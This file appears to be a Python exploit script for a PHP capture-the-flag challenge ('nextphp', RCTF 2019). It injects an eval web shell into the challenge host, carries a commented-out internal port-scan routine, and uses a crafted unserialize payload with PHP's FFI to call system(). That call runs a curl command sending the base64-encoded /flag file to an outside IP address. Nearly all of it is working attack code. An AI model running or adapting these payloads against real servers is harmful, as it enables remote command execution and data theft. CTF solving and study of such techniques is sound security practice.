import requests

import urllib

def test(payload):
    payload1=urllib.quote('eval($_POST["a"]);')
    payload2={'a':payload}
    r=requests.post('http://nextphp.2019.rctf.rois.io/?a=%s' % payload1,data=payload2)
    return r.text

def scan(ports):
    for i in ports:
        print i
        payload='''
        $timeout = 0.5;
        $c = @fsockopen('127.0.0.1', %d, $en, $es, $timeout);
        if (is_resource($c)) {
            echo 'open';
            fclose($c);
        } else {
            echo 'close';
        }
        ''' % i
        res=test(payload)
        if 'open' in res: print i+' open'

#ports=[5900,2601,2604,389,161,119,113,111,110,79,5554,7626,8011,7306,1024,7001,7002,9080,9090,1098,1099,4444,4445,8009,8093,1434,1521,5432,1158,2100,512,513,514,873,2375,5984,6379,9200,9300,11211,27015,27016,27017,27018,28017,50000,50070,50030]
#scan(ports)

payload='''
$a=unserialize(\'C:1:"A":129:{a:3:{s:3:"ret";N;s:4:"func";s:9:"FFI::cdef";s:3:"arg";s:66:"const char * getenv(const char *);int system(const char *command);";}}\');
$ffi=$a->ret;
$b=$ffi->system("curl http://39.108.36.103:1234/`cat /flag|base64`");
var_dump($b);
'''

print test(payload)